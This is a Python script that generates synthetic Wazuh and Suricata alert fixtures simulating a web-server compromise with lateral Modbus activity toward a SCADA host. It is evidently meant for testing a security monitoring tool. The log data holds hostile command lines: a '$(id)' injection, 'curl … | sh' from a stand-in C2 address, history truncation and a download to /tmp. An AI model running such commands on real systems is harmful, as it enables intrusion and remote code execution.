#!/usr/bin/env python3
"""Generate synthetic Wazuh (alerts.json) and Suricata (eve.json) fixtures for COIP.

The records follow the real field layouts of both tools. Rule IDs in the 100xxx
range are local custom rules; Suricata SIDs in the 9xxxxxx range are local.
Everything here is synthetic. 203.0.113.0/24 and 198.51.100.0/24 are
documentation ranges (RFC 5737).

Usage:
    python tools/make_fixtures.py              # fixed timeline (2026-11-14 09:xx WIB)
    python tools/make_fixtures.py --shift-now  # same timeline, ending ~2 minutes ago
"""
from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "backend" / "app" / "data"
WIB = timezone(timedelta(hours=7))
UTC = timezone.utc

C2 = "203.0.113.45"
NRD = "198.51.100.77"
OTHER = "198.51.100.20"

AGENTS = {
    "SRV-APP": {"id": "001", "name": "srv-app-01", "ip": "10.10.10.20"},
    "SRV-DB": {"id": "002", "name": "srv-db-01", "ip": "10.20.20.10"},
    "SRV-SCADA": {"id": "003", "name": "srv-scada-01", "ip": "10.20.20.11"},
    "WS-01": {"id": "004", "name": "ws-01", "ip": "10.10.10.101"},
    "WS-02": {"id": "005", "name": "ws-02", "ip": "10.10.10.102"},
    "WS-OPS-01": {"id": "006", "name": "ws-ops-01", "ip": "10.20.20.101"},
}

# offset (seconds from base), kind, payload
W = "wazuh"
S = "suricata"


def mitre(ids, tactics, techniques):
    return {"id": ids, "tactic": tactics, "technique": techniques}


EVENTS = [
    # background noise
    (60, W, dict(asset="WS-OPS-01", level=3, rid="5501", desc="PAM: Login session opened.", groups=["pam", "syslog", "authentication_success"],
                 data={"dstuser": "operator1"}, log="Nov 14 09:01:00 ws-ops-01 sshd[2211]: pam_unix(sshd:session): session opened for user operator1")),
    (140, W, dict(asset="SRV-DB", level=3, rid="5501", desc="PAM: Login session opened.", groups=["pam", "syslog", "authentication_success"],
                  data={"dstuser": "dbadmin"}, log="Nov 14 09:02:20 srv-db-01 sshd[884]: pam_unix(sshd:session): session opened for user dbadmin")),
    (265, S, dict(src="10.10.10.101", sport=40222, dst=OTHER, dport=443, sid=9000101, sig="SURICATA TLS invalid handshake message",
                  cat="Generic Protocol Command Decode", sev=3, app="tls")),
    (330, W, dict(asset="WS-01", level=3, rid="5501", desc="PAM: Login session opened.", groups=["pam", "syslog", "authentication_success"],
                  data={"dstuser": "staff1"}, log="Nov 14 09:05:30 ws-01 sshd[1301]: pam_unix(sshd:session): session opened for user staff1")),

    # incident 1: SRV-APP compromise with lateral Modbus activity toward SRV-SCADA
    (727, S, dict(src=C2, sport=51322, dst="10.10.10.20", dport=443, sid=9001001,
                  sig="ET WEB_SERVER Suspicious Command Injection Attempt in HTTP Request",
                  cat="Web Application Attack", sev=1, app="http",
                  mitre=(["T1190"], ["Initial Access"], ["Exploit Public-Facing Application"]))),
    (729, W, dict(asset="SRV-APP", level=10, rid="100110", desc="Command injection pattern followed by HTTP 200 (possible successful web exploitation)",
                  groups=["web", "attack", "local"], data={"srcip": C2, "protocol": "POST", "id": "200", "url": "/api/v1/export?fmt=$(id)"},
                  mitre=mitre(["T1190"], ["Initial Access"], ["Exploit Public-Facing Application"]),
                  log='203.0.113.45 - - [14/Nov/2026:09:12:08 +0700] "POST /api/v1/export?fmt=$(id) HTTP/1.1" 200 1432 "-" "python-requests/2.31"',
                  loc="/var/log/nginx/access.log", decoder="web-accesslog")),
    (824, W, dict(asset="SRV-APP", level=12, rid="100120", desc="Web server process spawned a shell (nginx -> /bin/sh)",
                  groups=["audit", "execution", "local"],
                  data={"audit": {"exe": "/bin/sh", "parent": "/usr/sbin/nginx", "command": "sh -c 'curl -s http://203.0.113.45/s | sh'", "uid": "33"}},
                  mitre=mitre(["T1059.004"], ["Execution"], ["Unix Shell"]),
                  log="type=EXECVE msg=audit(1763086424.211:9921): argc=3 a0=\"sh\" a1=\"-c\" a2=\"curl -s http://203.0.113.45/s | sh\"",
                  loc="/var/log/audit/audit.log", decoder="auditd")),
    (870, S, dict(src="10.10.10.20", sport=44122, dst=C2, dport=443, sid=9002001,
                  sig="ET MALWARE Possible C2 Beacon (TLS JA3 match)", cat="A Network Trojan was detected", sev=1, app="tls",
                  mitre=(["T1071.001"], ["Command and Control"], ["Web Protocols"]))),
    (1022, W, dict(asset="SRV-APP", level=9, rid="100140", desc="New cron job created by web server user",
                   groups=["syscheck", "persistence", "local"],
                   data={"path": "/etc/cron.d/sysupdate", "event": "added", "mode": "realtime", "uname": "www-data"},
                   mitre=mitre(["T1053.003"], ["Persistence"], ["Cron"]),
                   log="File '/etc/cron.d/sysupdate' added. Mode: realtime", loc="syscheck", decoder="syscheck_new_entry")),
    (1166, W, dict(asset="SRV-APP", level=8, rid="5902", desc="New user added to the system.",
                   groups=["adduser", "account_changed"], data={"dstuser": "svc_update", "uid": "1001"},
                   mitre=mitre(["T1136.001"], ["Persistence"], ["Local Account"]),
                   log="Nov 14 09:19:26 srv-app-01 useradd[4410]: new user: name=svc_update, UID=1001, GID=1001", loc="/var/log/auth.log", decoder="adduser")),
    (1170, S, dict(src="10.10.10.20", sport=44140, dst=C2, dport=443, sid=9002001,
                   sig="ET MALWARE Possible C2 Beacon (TLS JA3 match)", cat="A Network Trojan was detected", sev=1, app="tls",
                   mitre=(["T1071.001"], ["Command and Control"], ["Web Protocols"]))),
    (1428, S, dict(src="10.10.10.20", sport=49211, dst="10.20.20.11", dport=502, sid=9003001,
                   sig="ET SCADA Modbus Device Identification Read (FC43) from non-engineering host",
                   cat="Attempted Information Leak", sev=2, app="modbus",
                   mitre=(["T0846"], ["Discovery"], ["Remote System Discovery"]))),
    (1470, S, dict(src="10.10.10.20", sport=44166, dst=C2, dport=443, sid=9002001,
                   sig="ET MALWARE Possible C2 Beacon (TLS JA3 match)", cat="A Network Trojan was detected", sev=1, app="tls",
                   mitre=(["T1071.001"], ["Command and Control"], ["Web Protocols"]))),
    (1502, S, dict(src="10.10.10.20", sport=49213, dst="10.20.20.11", dport=502, sid=9003001,
                   sig="ET SCADA Modbus Device Identification Read (FC43) from non-engineering host",
                   cat="Attempted Information Leak", sev=2, app="modbus",
                   mitre=(["T0846"], ["Discovery"], ["Remote System Discovery"]))),
    (1600, W, dict(asset="SRV-SCADA", level=10, rid="100210", desc="Modbus/TCP session from unapproved source address",
                   groups=["ics", "modbus", "local"], data={"srcip": "10.10.10.20", "dstport": "502", "unit_id": "1"},
                   mitre=mitre(["T1046"], ["Discovery"], ["Network Service Discovery"]),
                   log="modbus-guard[771]: ALERT session from 10.10.10.20:49213 not in allowlist (unit 1, fc 43)", loc="/var/log/modbus-guard.log", decoder="modbus-guard")),
    (1695, S, dict(src="10.10.10.20", sport=49230, dst="10.20.20.11", dport=502, sid=9003002,
                   sig="ET SCADA Modbus Write Single Coil from non-whitelisted host",
                   cat="Attempted Administrator Privilege Gain", sev=1, app="modbus",
                   mitre=(["T0855"], ["Impair Process Control"], ["Unauthorized Command Message"]))),
    (1812, W, dict(asset="SRV-APP", level=10, rid="100150", desc="Shell history file truncated",
                   groups=["audit", "defense_evasion", "local"], data={"audit": {"command": "truncate -s 0 /home/svc_update/.bash_history", "uid": "1001"}},
                   mitre=mitre(["T1070.003"], ["Defense Evasion"], ["Clear Command History"]),
                   log="type=EXECVE msg=audit(1763087532.502:9987): argc=4 a0=\"truncate\" a1=\"-s\" a2=\"0\" a3=\"/home/svc_update/.bash_history\"",
                   loc="/var/log/audit/audit.log", decoder="auditd")),

    # incident 2: suspicious download on WS-02 (lower severity, unrelated)
    (2470, S, dict(src="10.10.10.102", sport=51188, dst=NRD, dport=443, sid=9004001,
                   sig="ET POLICY TLS SNI Newly Registered Domain (cdn-sync-9.test)", cat="Potentially Bad Traffic", sev=2, app="tls",
                   mitre=(["T1071.001"], ["Command and Control"], ["Web Protocols"]))),
    (2515, W, dict(asset="WS-02", level=8, rid="100160", desc="Executable written to /tmp after outbound download (curl)",
                   groups=["audit", "command_and_control", "local"],
                   data={"audit": {"command": "curl -o /tmp/.u https://cdn-sync-9.test/a", "uid": "1000"}},
                   mitre=mitre(["T1105"], ["Command and Control"], ["Ingress Tool Transfer"]),
                   log="type=EXECVE msg=audit(1763088115.020:10211): argc=4 a0=\"curl\" a1=\"-o\" a2=\"/tmp/.u\" a3=\"https://cdn-sync-9.test/a\"",
                   loc="/var/log/audit/audit.log", decoder="auditd")),
]


def build(base_utc: datetime):
    rnd = random.Random(7)
    wazuh, eve = [], []
    flow_id = 1423000000000000
    for off, kind, p in EVENTS:
        ts = base_utc + timedelta(seconds=off)
        if kind == W:
            agent = AGENTS[p["asset"]]
            rule = {
                "level": p["level"], "description": p["desc"], "id": p["rid"], "firedtimes": 1, "mail": False, "groups": p["groups"],
            }
            if p.get("mitre"):
                rule["mitre"] = p["mitre"]
            doc = {
                "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}+0000",
                "rule": rule,
                "agent": agent,
                "manager": {"name": "wazuh-manager"},
                "id": f"{int(ts.timestamp())}.{rnd.randint(100000, 999999)}",
                "full_log": p["log"],
                "decoder": {"name": p.get("decoder", "pam" if p["rid"] == "5501" else "syslog")},
                "data": p["data"],
                "location": p.get("loc", "/var/log/auth.log"),
            }
            wazuh.append(doc)
        else:
            flow_id += rnd.randint(1000, 90000)
            local = ts.astimezone(WIB)
            alert = {
                "action": "allowed", "gid": 1, "signature_id": p["sid"], "rev": 2, "signature": p["sig"],
                "category": p["cat"], "severity": p["sev"],
            }
            if p.get("mitre"):
                ids, tactics, techniques = p["mitre"]
                alert["metadata"] = {
                    "mitre_technique_id": ids, "mitre_tactic_name": tactics, "mitre_technique_name": techniques,
                }
            doc = {
                "timestamp": local.strftime("%Y-%m-%dT%H:%M:%S.") + f"{local.microsecond:06d}+0700",
                "flow_id": flow_id,
                "in_iface": "eth1",
                "event_type": "alert",
                "src_ip": p["src"], "src_port": p["sport"], "dest_ip": p["dst"], "dest_port": p["dport"],
                "proto": "TCP", "app_proto": p["app"],
                "alert": alert,
            }
            eve.append(doc)
    return wazuh, eve


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--shift-now", action="store_true")
    args = ap.parse_args()
    if args.shift_now:
        last = max(e[0] for e in EVENTS)
        base = datetime.now(UTC).replace(microsecond=0) - timedelta(seconds=last + 120)
    else:
        base = datetime(2026, 11, 14, 2, 0, 0, tzinfo=UTC)  # 09:00 WIB
    wazuh, eve = build(base)
    (OUT / "wazuh_alerts.json").write_text(json.dumps(wazuh, indent=2) + "\n")
    (OUT / "suricata_eve.json").write_text(json.dumps(eve, indent=2) + "\n")
    print(f"wrote {len(wazuh)} wazuh alerts and {len(eve)} suricata alerts to {OUT}")


if __name__ == "__main__":
    main()
